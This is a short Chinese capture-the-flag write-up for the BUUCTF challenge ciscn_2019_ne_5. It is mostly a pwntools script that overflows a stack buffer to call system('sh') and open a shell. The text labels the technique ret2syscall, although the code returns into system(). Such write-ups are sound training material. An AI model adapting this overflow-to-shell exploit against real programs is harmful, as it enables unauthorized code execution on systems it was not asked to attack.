# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#ciscn_2019_ne_5)

这个一道ret2syscall(32)，checksec一下

# exp

```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')
#p=remote('node5.buuoj.cn',26132)
p=process('./ciscn_2019_ne_5')
elf=ELF('./ciscn_2019_ne_5')
system_addr=elf.sym['system']
sh_addr=0x80482ea
payload=b'A'*(0x48+0x4)+p32(system_addr)+p32(0x12345678)+p32(sh_addr)#由于利用printf()来执行所以填充的地址不能有\x00，所以是0x12345678
#gdb.attach(p)
#print(hex(system_addr))
p.sendlineafter('password:',b'administrator')
p.sendlineafter('Exit\n:',b'1')
p.sendlineafter('info:',payload)
p.sendlineafter('Exit\n:',b'4')
p.interactive()
```

